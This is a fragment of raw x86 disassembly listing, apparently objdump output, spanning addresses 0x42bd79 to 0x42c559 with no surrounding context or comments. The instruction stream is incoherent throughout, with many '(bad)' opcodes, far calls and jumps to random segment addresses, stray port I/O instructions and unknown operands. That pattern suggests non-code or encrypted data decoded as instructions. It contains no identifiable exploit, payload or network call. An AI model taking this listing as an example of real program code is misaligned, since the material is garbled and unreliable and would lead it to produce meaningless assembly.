  42bd79:	es bnd jp 0x42bd4b
  42bd7d:	xchg   ebx,eax
  42bd7e:	mov    al,0x34
  42bd80:	pop    edi
  42bd81:	xchg   edx,eax
  42bd82:	jns    0x42bdc5
  42bd84:	(bad)  
  42bd85:	jge    0x42bdc1
  42bd87:	mov    dh,0x15
  42bd89:	stos   DWORD PTR es:[edi],eax
  42bd8a:	adc    dh,ah
  42bd8c:	daa    
  42bd8d:	cmp    ebx,ebx
  42bd8f:	cdq    
  42bd90:	inc    edi
  42bd91:	call   0xa977:0xeb79a93b
  42bd98:	add    eax,0x9da85b9b
  42bd9d:	pushf  
  42bd9e:	jge    0x42bdbd
  42bda0:	enter  0x640f,0xd0
  42bda4:	pop    esi
  42bda5:	jge    0x42bd57
  42bda7:	xchg   esp,eax
  42bda8:	adc    eax,0xe672288f
  42bdad:	test   eax,0xd3a45579
  42bdb2:	adc    BYTE PTR ds:0xe0c38220,dl
  42bdb8:	and    cl,BYTE PTR [ecx-0x26]
  42bdbb:	aaa    
  42bdbc:	dec    ebp
  42bdbd:	push   esi
  42bdbe:	sub    esp,ebp
  42bdc0:	pop    ecx
  42bdc1:	cmp    ax,WORD PTR [ecx+0x15]
  42bdc5:	mov    ss,WORD PTR [edx-0x10cbb919]
  42bdcb:	adc    BYTE PTR [eax],ch
  42bdcd:	or     DWORD PTR [edx],ebp
  42bdcf:	mov    ecx,0x434abdeb
  42bdd4:	and    al,0xf6
  42bdd6:	dec    eax
  42bdd7:	frstor [esi+0x3d]
  42bdda:	cmp    BYTE PTR [edx],al
  42bddc:	add    ecx,DWORD PTR [ebp+ebp*2+0x3a7d2bb7]
  42bde3:	repz fstp st(1)
  42bde6:	(bad)  
  42bde7:	mov    ah,0xc6
  42bde9:	or     esp,esi
  42bdeb:	dec    ebp
  42bdec:	stos   BYTE PTR es:[edi],al
  42bded:	call   0xb7be:0xd749d37b
  42bdf4:	mov    ds:0x38a4c232,al
  42bdf9:	addr16 inc edi
  42bdfb:	sbb    BYTE PTR ds:0xfbe65aa0,dh
  42be01:	(bad)  
  42be02:	dec    esp
  42be03:	loopne 0x42bd9c
  42be05:	sti    
  42be06:	imul   esi,DWORD PTR [edi-0x1618618f],0x1254a953
  42be10:	aam    0xa1
  42be12:	mov    ds:0xc138e785,eax
  42be17:	lock pop esp
  42be19:	sahf   
  42be1a:	sbb    eax,DWORD PTR [esi+eiz*8]
  42be1d:	mov    ebp,0x34e378c3
  42be22:	dec    BYTE PTR [esi-0x5784662d]
  42be28:	popf   
  42be29:	jmp    0x1293:0x670bbf0f
  42be30:	hlt    
  42be31:	mov    ds:0x5f8e52eb,al
  42be36:	in     eax,dx
  42be37:	lea    ebp,[ecx+0x767d23c3]
  42be3d:	and    ah,BYTE PTR [edi+0x502d1765]
  42be43:	mov    ch,0xbf
  42be45:	mov    ebp,0x505d890
  42be4a:	and    dh,0x10
  42be4d:	sub    esp,DWORD PTR [ebx+0x62991f29]
  42be53:	jnp    0x42beca
  42be55:	jl     0x42be47
  42be57:	stc    
  42be58:	fstp   QWORD PTR [ebx+ebp*2-0x6342819e]
  42be5f:	mov    ah,0xbd
  42be61:	sbb    ch,BYTE PTR [edx]
  42be63:	cmp    eax,0xc79c09f1
  42be68:	repnz mov dh,0xb6
  42be6b:	les    ebx,FWORD PTR [ecx-0x6596c45f]
  42be71:	stc    
  42be72:	pop    esp
  42be73:	aad    0xcd
  42be75:	fmul   st(0),st
  42be77:	and    eax,edx
  42be79:	xor    ch,BYTE PTR [eiz*4-0x25b668ce]
  42be80:	pop    edx
  42be81:	or     BYTE PTR [edi+0x492e66b0],bh
  42be87:	loope  0x42be0f
  42be89:	cmp    DWORD PTR [ebp+0x5f1d7ade],0x9
  42be90:	sbb    esi,esi
  42be92:	mov    esi,0x6b9b10aa
  42be97:	js     0x42bef7
  42be99:	popf   
  42be9a:	or     al,0x2c
  42be9c:	push   ds
  42be9d:	ror    DWORD PTR [ebx],cl
  42be9f:	push   eax
  42bea0:	shl    BYTE PTR [esi-0x77e27736],0x8e
  42bea7:	sub    ah,BYTE PTR [eax]
  42bea9:	mov    DWORD PTR [ebx+0x203c812c],edi
  42beaf:	mov    bl,0x73
  42beb1:	mov    ebp,edi
  42beb3:	loop   0x42be93
  42beb5:	shl    DWORD PTR [edi+0x53f14528],1
  42bebb:	sbb    BYTE PTR [esi-0x4c5c4468],al
  42bec1:	pushf  
  42bec2:	mov    ch,0x4
  42bec4:	leave  
  42bec5:	call   0x345d:0xe2adc9d9
  42becc:	rcr    BYTE PTR [ebp+0x5e8f1c0b],0xaa
  42bed3:	dec    esp
  42bed4:	pop    edx
  42bed5:	fld    st(4)
  42bed7:	lods   eax,DWORD PTR ds:[esi]
  42bed8:	or     al,0x8
  42beda:	ja     0x42be6d
  42bedc:	mov    ah,0xfd
  42bede:	mov    al,0xb0
  42bee0:	aad    0x8a
  42bee2:	jbe    0x42bed4
  42bee4:	data16 je 0x42bed4
  42bee7:	cmc    
  42bee8:	sbb    cl,cl
  42beea:	mov    cl,0xca
  42beec:	(bad)  
  42beed:	jmp    0x6118bdf0
  42bef2:	shl    eax,1
  42bef4:	pop    ebp
  42bef5:	or     ah,BYTE PTR [ebx+0x2bd0247e]
  42befb:	popf   
  42befc:	in     eax,0x37
  42befe:	and    eax,0xe6f7b2a9
  42bf03:	dec    ebp
  42bf04:	out    0x48,eax
  42bf06:	mov    esi,0xbbc9a7ea
  42bf0b:	mov    ah,0x8b
  42bf0d:	xchg   DWORD PTR [edi],esp
  42bf0f:	and    BYTE PTR ds:0x93f38745,dl
  42bf15:	repz mov ds:0xc4292dd4,eax
  42bf1b:	sub    edx,eax
  42bf1d:	pop    eax
  42bf1e:	add    edx,edi
  42bf20:	and    edi,DWORD PTR [ebx-0x746956f1]
  42bf26:	and    ah,BYTE PTR [esi]
  42bf28:	lods   eax,DWORD PTR ds:[esi]
  42bf29:	push   ss
  42bf2a:	adc    al,0xb8
  42bf2c:	xor    eax,0x1fed0b04
  42bf31:	cdq    
  42bf32:	and    eax,0xaf1d8867
  42bf37:	mov    cs,WORD PTR [ebx-0x5a]
  42bf3a:	imul   esi,DWORD PTR [ebx+0x45],0xfffffffe
  42bf3e:	jg     0x42bf5b
  42bf40:	(bad)  
  42bf41:	addr16 push 0xb582965e
  42bf47:	in     al,0xf9
  42bf49:	test   al,0xc0
  42bf4b:	mov    ecx,0xa934bf2b
  42bf50:	sub    cl,BYTE PTR [eax]
  42bf52:	mov    bl,0x84
  42bf54:	call   0x4ba5:0x9e764368
  42bf5b:	or     BYTE PTR [ecx-0x1c97bf7b],dh
  42bf61:	cdq    
  42bf62:	cmp    ebx,DWORD PTR [edi+0x5c42546f]
  42bf68:	or     DWORD PTR [eax-0x14],edi
  42bf6b:	inc    edx
  42bf6c:	call   0x4a22:0x43b5ab7a
  42bf73:	in     eax,0x5
  42bf75:	or     ebx,DWORD PTR [edi+edi*1-0x62]
  42bf79:	and    bh,BYTE PTR [eax]
  42bf7b:	mov    bh,0xbd
  42bf7d:	mov    cl,0x7f
  42bf7f:	lock sbb ch,BYTE PTR [ecx]
  42bf82:	and    dh,BYTE PTR [eax+0x448e0294]
  42bf88:	out    0x9e,eax
  42bf8a:	sub    ebx,DWORD PTR [esp+ecx*1-0x60d471eb]
  42bf91:	bound  ecx,QWORD PTR [edx-0xf56e523]
  42bf97:	loop   0x42bf34
  42bf99:	sub    al,0xff
  42bf9b:	loopne 0x42bfe4
  42bf9d:	mov    ds:0x3628f6bb,eax
  42bfa2:	and    al,0x42
  42bfa4:	pop    ss
  42bfa5:	push   ss
  42bfa6:	lock mov ebx,DWORD PTR [esp+edx*4]
  42bfaa:	mov    ecx,0xecb40344
  42bfaf:	jns    0x42bf9a
  42bfb1:	pop    ss
  42bfb2:	iret   
  42bfb3:	fidivr WORD PTR [esi]
  42bfb5:	or     DWORD PTR [edx],0x712125f5
  42bfbb:	xchg   DWORD PTR [ebx],ecx
  42bfbd:	pop    ss
  42bfbe:	int3   
  42bfbf:	mov    edi,0xfde5019c
  42bfc4:	sbb    BYTE PTR [edi-0x76760b9c],0xa4
  42bfcb:	sub    DWORD PTR [esi+0x2167590d],eax
  42bfd1:	fidivr DWORD PTR [ebx+0xb94d5fc]
  42bfd7:	call   0x5709560a
  42bfdc:	adc    eax,0x5cfbae59
  42bfe1:	mov    ebp,0xa6e98155
  42bfe6:	retf   
  42bfe7:	cld    
  42bfe8:	jo     0x42c018
  42bfea:	ficom  DWORD PTR [ecx-0x296cdb83]
  42bff0:	adc    esp,esp
  42bff2:	call   0x25e3a84b
  42bff7:	push   ebp
  42bff8:	dec    edi
  42bff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bffa:	mov    esp,DWORD PTR [esi]
  42bffc:	icebp  
  42bffd:	(bad)  
  42bffe:	repnz cld 
  42c000:	mov    al,0xb1
  42c002:	push   es
  42c003:	inc    ebp
  42c004:	scas   al,BYTE PTR es:[edi]
  42c005:	pusha  
  42c006:	mov    esp,0x6a848034
  42c00b:	sub    ah,BYTE PTR [ebp-0x2710ceea]
  42c011:	cmp    eax,0x604e389f
  42c016:	push   0xffffff9e
  42c018:	sbb    eax,0x1ee47689
  42c01d:	cli    
  42c01e:	inc    ecx
  42c01f:	mov    bh,0x7c
  42c021:	test   al,0xcb
  42c023:	xchg   ebx,eax
  42c024:	bound  ecx,QWORD PTR [eax-0x3b]
  42c027:	jb     0x42bfd2
  42c029:	(bad)
  42c02d:	enter  0xf4e8,0x9d
  42c031:	es dec edx
  42c033:	outs   dx,DWORD PTR ds:[esi]
  42c034:	(bad)  
  42c035:	xchg   esp,eax
  42c036:	call   DWORD PTR [eax+0x5fde5a0e]
  42c03c:	popa   
  42c03d:	hlt    
  42c03e:	push   ss
  42c03f:	adc    DWORD PTR [ebp+0x75983528],0x6a
  42c046:	inc    edi
  42c047:	in     eax,dx
  42c048:	lds    ebp,FWORD PTR [esi]
  42c04a:	or     bh,BYTE PTR [ebp+0x2771f918]
  42c050:	sbb    bl,bl
  42c052:	jns    0x42c02a
  42c054:	jbe    0x42bffd
  42c056:	cmp    esi,DWORD PTR [edi+0x2e]
  42c059:	mov    bl,BYTE PTR [ebp-0x702d6f57]
  42c05f:	daa    
  42c060:	or     edi,eax
  42c062:	mov    bl,0x64
  42c064:	(bad)  
  42c065:	sar    DWORD PTR [esi-0x49],1
  42c068:	inc    ebp
  42c069:	jo     0x42c01d
  42c06b:	in     eax,0x47
  42c06d:	xchg   edi,eax
  42c06e:	(bad)  
  42c06f:	fwait
  42c070:	sbb    DWORD PTR [ecx+0x6da74261],edi
  42c076:	pop    ds
  42c077:	ins    BYTE PTR es:[edi],dx
  42c078:	mov    dl,0xb7
  42c07a:	sti    
  42c07b:	jbe    0x42c09e
  42c07d:	(bad)  
  42c07e:	(bad)  
  42c07f:	pop    ss
  42c080:	xor    esp,DWORD PTR [ecx-0x75]
  42c083:	sar    al,0x7c
  42c086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c087:	add    esp,edx
  42c089:	add    ebx,0xffffffc7
  42c08c:	pop    ebx
  42c08d:	xor    BYTE PTR [esp+edx*4+0x2baf7d92],bh
  42c094:	add    eax,0x9394bc25
  42c099:	adc    cl,BYTE PTR [edx+0x42d61bfc]
  42c09f:	jb     0x42c0eb
  42c0a1:	adc    eax,0x80c44524
  42c0a6:	ins    DWORD PTR es:[edi],dx
  42c0a7:	repnz sbb al,0xb9
  42c0aa:	pop    edi
  42c0ab:	jecxz  0x42c0e1
  42c0ad:	add    cl,bh
  42c0af:	push   cs
  42c0b0:	in     al,0x9a
  42c0b2:	dec    ebx
  42c0b3:	cmp    ecx,DWORD PTR [ebx]
  42c0b5:	or     al,0x1b
  42c0b7:	pop    es
  42c0b8:	icebp  
  42c0b9:	ds cli 
  42c0bb:	repnz sbb BYTE PTR [ecx],cl
  42c0be:	aas    
  42c0bf:	pushf  
  42c0c0:	out    0xb0,al
  42c0c2:	scas   al,BYTE PTR es:[edi]
  42c0c3:	push   ebp
  42c0c4:	cwde   
  42c0c5:	push   esp
  42c0c6:	mov    bl,0x62
  42c0c8:	push   ebp
  42c0c9:	inc    BYTE PTR [eiz*8+0x62738eee]
  42c0d0:	mov    ah,0xd9
  42c0d2:	mov    bh,0x6e
  42c0d4:	jne    0x42c060
  42c0d6:	dec    esp
  42c0d7:	mov    bh,0x8
  42c0d9:	(bad)  
  42c0da:	(bad)  [eax]
  42c0dc:	inc    edi
  42c0de:	xor    BYTE PTR [ebp+0x55],ch
  42c0e1:	div    BYTE PTR [edx]
  42c0e3:	out    0xf1,eax
  42c0e5:	pushf  
  42c0e6:	es mov esp,0x6bdc8b5a
  42c0ec:	push   edx
  42c0ed:	jns    0x42c08e
  42c0ef:	int3   
  42c0f0:	mov    WORD PTR [edx-0x35599f09],es
  42c0f6:	fadd   QWORD PTR [eax]
  42c0f8:	sbb    BYTE PTR [edx+0x394ce961],0x25
  42c0ff:	repnz ins BYTE PTR es:[edi],dx
  42c101:	lea    esi,[esp+eax*2+0x6a4ef66e]
  42c108:	add    eax,0xd0edfbd3
  42c10d:	cmp    eax,0x69486c89
  42c112:	xchg   ebp,eax
  42c113:	add    eax,0x32734109
  42c118:	rcl    DWORD PTR [ebp+0x4c],cl
  42c11b:	addr16 add eax,0x60e86d90
  42c121:	sbb    DWORD PTR [ebp-0x5c],ecx
  42c124:	xchg   BYTE PTR [ecx],bl
  42c126:	sub    ch,BYTE PTR [edi-0x284180f6]
  42c12c:	std    
  42c12d:	push   edi
  42c12e:	mov    bh,0x18
  42c130:	nop
  42c131:	mov    ds:0x4fff32b,al
  42c136:	mov    ?,WORD PTR [eax+0x2d]
  42c139:	ins    DWORD PTR es:[edi],dx
  42c13a:	sub    BYTE PTR [ebp+0xf],cl
  42c13d:	and    BYTE PTR ds:0x79e818d5,ch
  42c143:	mov    WORD PTR [edx+0x6f],fs
  42c146:	dec    ebp
  42c147:	arpl   di,cx
  42c149:	popf   
  42c14a:	das    
  42c14b:	imul   ecx,DWORD PTR [ecx-0x15],0x1e
  42c14f:	mov    ecx,0xb4ab791d
  42c154:	lahf   
  42c155:	int    0x3b
  42c157:	sub    edi,DWORD PTR [esi-0x1373379]
  42c15d:	and    ebp,DWORD PTR [ebp-0x7b]
  42c160:	jmp    0x3219:0x2528b5f1
  42c167:	loop   0x42c135
  42c169:	(bad)  
  42c16b:	jl     0x42c1d0
  42c16d:	adc    ecx,ebp
  42c16f:	stos   DWORD PTR es:[edi],eax
  42c170:	mov    al,ss:0xa94bad37
  42c176:	sub    ebp,DWORD PTR [ebp-0x7a]
  42c179:	(bad)  
  42c17b:	inc    ebp
  42c17c:	pop    es
  42c17d:	and    BYTE PTR [esi-0x3458925c],dh
  42c183:	in     al,dx
  42c184:	sti    
  42c185:	adc    DWORD PTR ds:0x6eb5d716,ebx
  42c18b:	repz or esp,0xffffffbc
  42c18f:	xchg   esp,eax
  42c190:	lea    edi,[esi-0x4f563ece]
  42c196:	cld    
  42c197:	enter  0x48a5,0xb5
  42c19b:	mov    esp,0x6248fd75
  42c1a0:	stos   BYTE PTR es:[edi],al
  42c1a1:	adc    ecx,esp
  42c1a3:	inc    esp
  42c1a4:	repz inc esp
  42c1a6:	xchg   edx,eax
  42c1a7:	sub    eax,0xd140561b
  42c1ac:	in     eax,0x47
  42c1ae:	push   eax
  42c1af:	call   0xbb86433
  42c1b4:	fstp   QWORD PTR [esi]
  42c1b6:	mov    ecx,0xea2646d9
  42c1bb:	rcl    DWORD PTR [ebx],cl
  42c1bd:	xor    eax,0xee4dee95
  42c1c2:	xor    al,BYTE PTR [esi]
  42c1c4:	jbe    0x42c1d4
  42c1c6:	or     DWORD PTR [edx],eax
  42c1c8:	das    
  42c1c9:	cli    
  42c1ca:	lods   al,BYTE PTR ds:[esi]
  42c1cb:	(bad)  
  42c1cd:	fist   DWORD PTR [esi-0x46e6711a]
  42c1d3:	test   BYTE PTR [esi-0x67],bl
  42c1d6:	popf   
  42c1d7:	dec    edx
  42c1d8:	lds    edx,FWORD PTR [eax+0x5ce4ec4d]
  42c1de:	sub    al,cl
  42c1e0:	and    DWORD PTR [ecx],edi
  42c1e2:	xor    DWORD PTR [esi-0x39bb63ed],esi
  42c1e8:	pop    esp
  42c1e9:	cdq    
  42c1ea:	mov    ebx,0xa31b6a7a
  42c1ef:	cmp    ah,bl
  42c1f1:	pop    ss
  42c1f2:	sub    BYTE PTR [ecx],0x86
  42c1f5:	cdq    
  42c1f6:	or     DWORD PTR [ebx+edx*2],ecx
  42c1f9:	gs test eax,0xb111a51
  42c1ff:	or     al,0xcd
  42c201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c202:	retf   
  42c203:	cmc    
  42c204:	ja     0x42c1dd
  42c206:	mov    dl,0xc5
  42c208:	and    BYTE PTR [edi-0x6],dl
  42c20b:	imul   esi,DWORD PTR [eax],0xffffffcb
  42c20e:	mov    bl,0x24
  42c210:	mov    cl,0xa1
  42c212:	jo     0x42c1e4
  42c214:	add    eax,0xdec99d2
  42c219:	outs   dx,DWORD PTR ds:[esi]
  42c21a:	jae    0x42c203
  42c21c:	mov    bh,0x20
  42c21e:	sti    
  42c21f:	dec    esp
  42c220:	push   edi
  42c221:	xchg   edx,eax
  42c222:	test   al,0x36
  42c224:	jbe    0x42c236
  42c226:	mov    ah,0x30
  42c228:	cli    
  42c229:	test   al,0x8b
  42c22b:	sub    dh,bl
  42c22d:	repz inc ebx
  42c22f:	inc    edi
  42c230:	inc    esp
  42c231:	les    ebx,FWORD PTR [esp+edx*8+0x20]
  42c235:	jo     0x42c1f0
  42c237:	xchg   esp,eax
  42c238:	jne    0x42c209
  42c23a:	ret    
  42c23b:	push   ebx
  42c23c:	xchg   ebp,eax
  42c23d:	mov    eax,ds:0x6e7aea95
  42c242:	and    al,0x9d
  42c244:	pop    ds
  42c245:	stc    
  42c246:	xchg   ebp,eax
  42c247:	cmp    al,0x6
  42c249:	adc    edx,DWORD PTR [esi]
  42c24b:	push   cs
  42c24c:	mov    al,0xa2
  42c24e:	stos   DWORD PTR es:[edi],eax
  42c24f:	shr    ah,0xb2
  42c252:	jl     0x42c248
  42c254:	data16 mov al,ds:0x1df3ebd3
  42c25a:	mov    bl,0xa4
  42c25c:	sbb    dl,BYTE PTR [esi]
  42c25e:	cs retf 
  42c260:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c261:	push   0xbe32ed3b
  42c266:	fld    DWORD PTR [ebx+0x1c]
  42c269:	frndint 
  42c26b:	aas    
  42c26c:	lock push edi
  42c26e:	cdq    
  42c26f:	je     0x42c279
  42c271:	mov    al,ds:0x2606d92b
  42c276:	popf   
  42c277:	popa   
  42c278:	fs pop es
  42c27a:	xchg   ebp,eax
  42c27b:	pop    es
  42c27c:	mov    bh,0x84
  42c27e:	jp     0x42c256
  42c280:	push   ds
  42c281:	pop    ecx
  42c282:	shr    DWORD PTR [ecx],1
  42c284:	mov    ds:0xa6f4030e,eax
  42c289:	aaa    
  42c28a:	rol    BYTE PTR [ecx],cl
  42c28c:	ds push edx
  42c28e:	shl    BYTE PTR [ebx-0xc583b1e],0x95
  42c295:	push   ds
  42c296:	mov    ah,0x84
  42c298:	xor    edi,ebx
  42c29a:	xor    ch,dh
  42c29c:	jne    0x42c280
  42c29e:	in     ax,dx
  42c2a0:	pop    es
  42c2a1:	push   0x2923ab68
  42c2a6:	jmp    0x9d90:0x6186daf4
  42c2ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c2ae:	jnp    0x42c2b4
  42c2b0:	or     al,0xdf
  42c2b2:	sbb    al,0x73
  42c2b4:	dec    eax
  42c2b5:	cmp    esi,DWORD PTR [ecx]
  42c2b7:	mov    ds:0xd4b20cf8,al
  42c2bc:	mov    dh,0xa
  42c2be:	scas   eax,DWORD PTR es:[edi]
  42c2bf:	inc    esp
  42c2c0:	mov    al,0xd1
  42c2c2:	mov    ebp,ebx
  42c2c4:	clc    
  42c2c5:	add    DWORD PTR [ebp-0x415ddced],ebx
  42c2cb:	(bad)  
  42c2cc:	push   esi
  42c2cd:	call   0x84f85b63
  42c2d2:	add    BYTE PTR [ebp+0x17],ah
  42c2d5:	cmp    DWORD PTR [ecx],0xcba6ef2d
  42c2db:	xor    cl,ah
  42c2dd:	mov    esp,0x4fb9d40c
  42c2e2:	jge    0x42c33e
  42c2e4:	lock adc al,0x2b
  42c2e7:	inc    ebp
  42c2e8:	sbb    eax,0x7eb4cbee
  42c2ed:	ja     0x42c35e
  42c2ef:	jg     0x42c33a
  42c2f1:	mov    eax,ds:0x78d6f604
  42c2f6:	jo     0x42c371
  42c2f8:	adc    edx,DWORD PTR [ebx+esi*4-0x7e27e3a0]
  42c2ff:	dec    esp
  42c300:	fwait
  42c301:	les    ebp,FWORD PTR [edx]
  42c303:	aad    0x23
  42c305:	xchg   ebp,eax
  42c306:	call   0x7a2ab373
  42c30b:	xchg   edi,eax
  42c30c:	mov    ch,0xfd
  42c30e:	or     ah,ch
  42c310:	push   ss
  42c311:	ret    
  42c312:	dec    ebx
  42c313:	repz pop ds
  42c315:	jmp    0xddc79c13
  42c31a:	arpl   cx,di
  42c31c:	mov    edi,0x5e57fba0
  42c321:	out    0x6d,eax
  42c323:	loopne 0x42c302
  42c325:	push   edx
  42c326:	aam    0xb8
  42c328:	in     al,0xaa
  42c32a:	mov    ecx,0x40a8c6e4
  42c32f:	mov    ebx,0xea612145
  42c334:	ss and eax,0x491d0b78
  42c33a:	cli    
  42c33b:	aam    0x91
  42c33d:	sub    esp,edx
  42c33f:	sar    DWORD PTR [esi-0x7fb5345f],1
  42c345:	pop    edx
  42c346:	sub    eax,0x93583878
  42c34b:	or     DWORD PTR [ebx],esp
  42c34d:	test   eax,0x3621303b
  42c352:	imul   edx,DWORD PTR [esi-0x37e46608],0x5b24d683
  42c35c:	test   BYTE PTR [edx+eiz*8],al
  42c35f:	xchg   edi,eax
  42c360:	hlt    
  42c361:	mov    esp,0x9a0f7c49
  42c366:	ficom  WORD PTR [ebx]
  42c368:	and    eax,0x61ef5b53
  42c36d:	fsubr  QWORD PTR [edx+0x37741d22]
  42c373:	add    BYTE PTR [eax],ah
  42c375:	mov    al,0xbc
  42c377:	mov    ah,0x3c
  42c379:	push   es
  42c37a:	lahf   
  42c37b:	jae    0x42c352
  42c37d:	add    eax,0xdf1fec0e
  42c382:	and    bl,BYTE PTR [edi+0x7f]
  42c385:	sbb    BYTE PTR [ebx+0x3d],dl
  42c388:	and    ah,BYTE PTR [edx+0x7a]
  42c38b:	xchg   esi,eax
  42c38c:	push   ds
  42c38d:	add    DWORD PTR [eax+0x8f3d77e],ebp
  42c393:	outs   dx,DWORD PTR ds:[esi]
  42c394:	les    edx,FWORD PTR [ebp+edi*8+0x3b9c82c4]
  42c39b:	sub    DWORD PTR [edi+0x23dab56b],ebx
  42c3a1:	cdq    
  42c3a2:	scas   eax,DWORD PTR es:[edi]
  42c3a3:	pop    edi
  42c3a4:	dec    ebx
  42c3a5:	xor    ebx,esi
  42c3a7:	rol    ebp,cl
  42c3a9:	mov    esp,0x4b658cfa
  42c3ae:	mov    eax,0x269030f2
  42c3b3:	jp     0x42c33d
  42c3b5:	stc    
  42c3b6:	dec    edi
  42c3b7:	mov    ah,0xb7
  42c3b9:	mov    edx,0x183bf95c
  42c3be:	mov    esi,0x277eb50d
  42c3c3:	in     eax,0xfc
  42c3c5:	mov    eax,DWORD PTR [ebx-0x22]
  42c3c8:	sbb    eax,0x56fa4599
  42c3cd:	xlat   BYTE PTR ds:[ebx]
  42c3ce:	retf   0x604
  42c3d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c3d2:	imul   ecx,DWORD PTR [eax+0x49],0x5e
  42c3d6:	stc    
  42c3d7:	pop    ds
  42c3d8:	out    dx,eax
  42c3d9:	mov    cs,WORD PTR [eax-0x433afde5]
  42c3df:	je     0x42c40e
  42c3e1:	dec    eax
  42c3e2:	ss (bad) 
  42c3e4:	gs ins BYTE PTR es:[edi],dx
  42c3e6:	ins    BYTE PTR es:[edi],dx
  42c3e7:	out    0xd1,eax
  42c3e9:	mov    ah,0x60
  42c3eb:	push   edx
  42c3ec:	push   ds
  42c3ed:	cdq    
  42c3ee:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42c3f0:	popf   
  42c3f1:	daa    
  42c3f2:	sub    DWORD PTR [esi-0x55445f1b],eax
  42c3f8:	push   ecx
  42c3f9:	mov    al,0xf
  42c3fb:	daa    
  42c3fc:	adc    dl,BYTE PTR [ebx]
  42c3fe:	jns    0x42c419
  42c400:	aaa    
  42c401:	loop   0x42c3ec
  42c403:	hlt    
  42c404:	inc    ebx
  42c405:	mov    al,0x53
  42c407:	inc    eax
  42c408:	xchg   edi,eax
  42c409:	es daa 
  42c40b:	mov    ah,0xb5
  42c40d:	dec    esp
  42c40e:	pop    ss
  42c40f:	hlt    
  42c410:	mov    bh,0x26
  42c412:	mov    bl,0xb
  42c414:	and    al,0xd9
  42c416:	push   0xffffffa2
  42c418:	jnp    0x42c418
  42c41a:	int    0xf2
  42c41c:	xlat   BYTE PTR ds:[ebx]
  42c41d:	fsincos 
  42c41f:	mov    dh,dl
  42c421:	call   0x38b:0x1bb2161d
  42c428:	adc    eax,0x20a7bdac
  42c42d:	adc    DWORD PTR [ebp-0x206670d3],esi
  42c433:	jle    0x42c469
  42c435:	mov    ds:0xe47b7a82,eax
  42c43a:	mov    dh,0x8f
  42c43c:	test   DWORD PTR [ecx+0x2e4ca90b],ebx
  42c442:	and    esp,DWORD PTR [ebx+ebp*8+0xff14326]
  42c449:	leave  
  42c44a:	mov    esi,0xa164ec44
  42c44f:	dec    ebx
  42c450:	xchg   ebp,eax
  42c451:	bound  edx,QWORD PTR ds:0x23c134e5
  42c457:	leave  
  42c458:	push   edi
  42c459:	mov    eax,DWORD PTR ds:0xf8791fd1
  42c45f:	clc    
  42c460:	and    eax,0xa60dbc05
  42c465:	adc    DWORD PTR [ebx+0xa627ad7],0x5dfac607
  42c46f:	add    ah,al
  42c471:	mul    BYTE PTR [ecx]
  42c473:	pop    eax
  42c474:	sbb    BYTE PTR [edi-0x31],dh
  42c477:	mov    edx,0xf3538cb5
  42c47c:	mov    al,ds:0x1ef79640
  42c481:	test   eax,0x49439658
  42c486:	jo     0x42c486
  42c488:	int    0x9e
  42c48a:	(bad)  [ecx]
  42c48c:	stos   DWORD PTR es:[edi],eax
  42c48d:	cs pop esp
  42c48f:	pop    ebp
  42c490:	push   esp
  42c491:	retf   
  42c492:	sub    ecx,DWORD PTR [ebx+0x54bf8e3e]
  42c498:	pop    es
  42c499:	pshufw mm6,QWORD PTR [edi-0x17285a9b],0xf5
  42c4a1:	sbb    DWORD PTR [esi+0x7d],0xcd988922
  42c4a8:	stc    
  42c4a9:	(bad)  
  42c4aa:	cmp    cl,BYTE PTR [ecx-0x46458d5]
  42c4b0:	test   al,dl
  42c4b2:	sar    BYTE PTR [edx],cl
  42c4b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c4b5:	jle    0x42c4b8
  42c4b7:	push   0xfffffff0
  42c4b9:	int    0x7b
  42c4bb:	pop    edx
  42c4bc:	sub    DWORD PTR [ebp+0x6e],edi
  42c4bf:	jo     0x42c495
  42c4c1:	push   edi
  42c4c2:	test   al,0xe9
  42c4c4:	aad    0x5f
  42c4c6:	mov    bl,0xe7
  42c4c8:	and    al,0x3f
  42c4ca:	stos   DWORD PTR es:[edi],eax
  42c4cb:	push   ebp
  42c4cc:	popf   
  42c4cd:	ins    DWORD PTR es:[edi],dx
  42c4ce:	push   es
  42c4cf:	les    esp,FWORD PTR [ebp-0x24]
  42c4d2:	mov    ?,eax
  42c4d4:	repnz fwait
  42c4d6:	add    al,0x67
  42c4d8:	push   ss
  42c4d9:	push   0x38bb162e
  42c4de:	or     bl,BYTE PTR ds:0x1b547d2
  42c4e4:	stos   DWORD PTR es:[edi],eax
  42c4e5:	xchg   ebp,eax
  42c4e6:	lods   eax,DWORD PTR ds:[esi]
  42c4e7:	cmc    
  42c4e8:	out    0xdc,eax
  42c4ea:	mov    ds:0xdcbf1cfd,eax
  42c4ef:	xchg   ecx,eax
  42c4f0:	or     esp,eax
  42c4f2:	mov    dl,dh
  42c4f4:	dec    edi
  42c4f5:	sbb    BYTE PTR es:[edx+edx*2+0x32],dh
  42c4fa:	sahf   
  42c4fb:	cmc    
  42c4fc:	sar    DWORD PTR [esi+0x5e],1
  42c4ff:	jmp    0xed402d24
  42c504:	std    
  42c505:	lahf   
  42c506:	cmp    ecx,DWORD PTR [edx+0x3]
  42c509:	and    eax,0x1918328e
  42c50e:	ret    
  42c50f:	push   eax
  42c510:	mov    cl,0x61
  42c512:	repz cmp BYTE PTR [edi],0x9d
  42c516:	jnp    0x42c57f
  42c518:	(bad)  
  42c519:	sahf   
  42c51a:	push   sp
  42c51c:	push   ecx
  42c51d:	(bad)  
  42c51e:	mov    esp,0x8ba03f40
  42c523:	sbb    cl,cl
  42c525:	pushf  
  42c526:	sbb    eax,ebx
  42c528:	cmp    bl,BYTE PTR [ebx+ebp*1-0x663d5228]
  42c52f:	je     0x42c4ff
  42c531:	jb     0x42c4ee
  42c533:	jmp    0x5411:0x4bcd94c
  42c53a:	ds mov ebp,0xcbef2ac4
  42c540:	adc    DWORD PTR [edx-0x280333ff],esi
  42c546:	ret    
  42c547:	pop    edi
  42c548:	jnp    0x42c507
  42c54a:	into   
  42c54b:	adc    ah,BYTE PTR [edx-0xe12eea9]
  42c551:	xor    ebx,DWORD PTR [eax-0x190604db]
  42c557:	mov    bh,0xb7
  42c559:	xchg   ecx,eax
